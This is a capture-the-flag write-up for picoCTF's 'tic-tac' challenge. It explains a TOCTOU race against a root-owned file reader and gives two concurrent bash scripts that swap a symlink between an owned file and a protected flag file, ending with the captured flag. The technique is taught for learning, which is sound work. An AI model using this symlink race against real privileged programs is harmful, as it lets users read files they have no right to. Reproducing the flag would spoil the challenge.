# tic-tac

TOCTOU Vulnerability

## Description of challenge

You are asked to ssh into a shell which home directory contains
1. `flag.txt`, that is owned by the root user and which you have no permissions to rwx to, 
2. [`src.cpp`](./src.cpp), and
3. `txtreader`, which is a binary owned by the root user (compiled from `src.cpp`) which can open flag.txt, and which you can execute. 

However, `txtreader` only opens files whose owner corresponds to `getuid()`, and thus we can't just run that binary to obtain the flag. 

## What is a TOCTOU vulnerability?

A Time-of-check Time-of-update (TOCTOU) vulnerability is a vulnerability arising from race conditions between checking the state of a part of a system and the use of the results of that check. 

In general, the implication of TOCTOU vulnerabilities is that applications cannot assume the state managed by the operating system will not change between system calls.

## TOCTOU in the context of the challenge

We first create `src1.cpp` as a symlink to `src.cpp`. 

Now consider the following scripts

#### **`script1.sh`**
```bash
FLAG="picoCTF{"
while true; do
    OUTPUT=$(./txtreader src1.cpp)
    if echo "$OUTPUT" | grep -q "$FLAG"; then
        echo "Flag found: $OUTPUT"
        break
    fi
done
```

#### **`script2.sh`**
```bash
while true; do
    ln -sf flag.txt src1.cpp
    ln -sf src.cpp src1.cpp
done
```

Let us also define the following chunks of bytecode in `txtreader` compiled from the following `src.cpp` source code 

#### **`owner_checker`**
```c
if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
}
```

#### **`winner`**
```c
if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
} else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
}
```

In short, the idea is to exploit the interleaving of execution of `script1.sh` and `script2.sh` (which will be run concurrently) such that the following desired order is eventually achieved due to numerous execution attempts
1. `ln -sf src.cpp src1.cpp` in `script2.sh`
2. `owner_checker` in `./txtreader src1.cpp` in `script1.sh`
3. `ln -sf flag.txt src1.cpp` in `script2.sh`
4.  `winner` in `./txtreader src1.cpp` in `script1.sh`

Note that `src1.cpp` is originally already created a symlink to `src.cpp`, so `script2.sh` starts off with step 3 before going to step 1. This doesn't realy matter since both scripts are in infinite while loops (or for `script1.sh`, at least until the flag is printed), so as the threads of execution interleave due to CPU scheduling, the possibility of our desired order occurring remains. 

To run the scripts in parallel, we use the command

```bash
./script2.sh & ./script1.sh
```

Notice how `script1.sh` is placed at the back because then it is foregrounded (so we can see its output) while `script2.sh` is backgrounded. 

## Flag

```bash
[1] 4958
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file

...

Error: you don't own this file
Error: you don't own this file
Flag found: picoCTF{ToctoU_!s_3a5y_f482a247}
```